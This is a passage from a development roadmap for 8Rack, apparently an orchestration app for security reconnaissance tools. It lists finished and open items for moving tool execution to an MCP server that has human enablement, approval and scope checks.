      brings the enable switch (discovered tools start disabled) and adds enabled MCP tools to the
      Orchestrator's catalog.
- [x] **3. Tool server beside the local executor.** Done 2026-11-08 - see "MCP tool server (step 3)"
      in DEVELOPMENT.md. `mcp-servers/tools/` is a Python MCP server running a fixed catalog of eight
      recon tools over streamable HTTP (HTTPS for a real host), behind the bearer token from
      `MCP_TOKEN_<ID>`; it returns raw stdout/stderr/exit code, owns its own path containment, and kills
      the process group on timeout/disconnect. 8Rack discovers tools disabled, a human enables them
      (`PATCH /api/mcp/tools/:id`, persisted), enabled tools join the Orchestrator catalog, and a call
      runs through the unchanged request → approval → scope-checked → `ingestExecution` path
      (`toolManager.ts#runMcpRecord`). Scope is enforced at request and confirm time - MCP ids are never
      local-only, so an out-of-scope or untargetable call blocks. Still open from this item's wish list:
      a per-mission/global **setting to pick local vs MCP** for the same tool (today an MCP tool is a
      separate `<server>.<tool>` catalog entry alongside the local one, which is enough to compare them),
      and live output streaming (coarser over MCP).
- [ ] **Scan source IP.** Tools now run from the scanning host's address, not this machine's. Record
      that address on each mission (some programs require registered source IPs) and show it before a
      run is approved.
- [ ] **Server unreachable.** Show the tool server as offline in the Tool Registry and fail requests with a
      clear error, instead of leaving orders waiting. A run in progress when the connection drops is
      marked failed, not left running.
- [ ] **4. Compare, then remove the local executor.** Run the same mission both ways; remove
      `toolExecutor.ts` execution only once findings, assets and reports match.
- [ ] **Later, separately:** consider Ollama's native tool-calling for MCP tools instead of the
      plain-text convention.

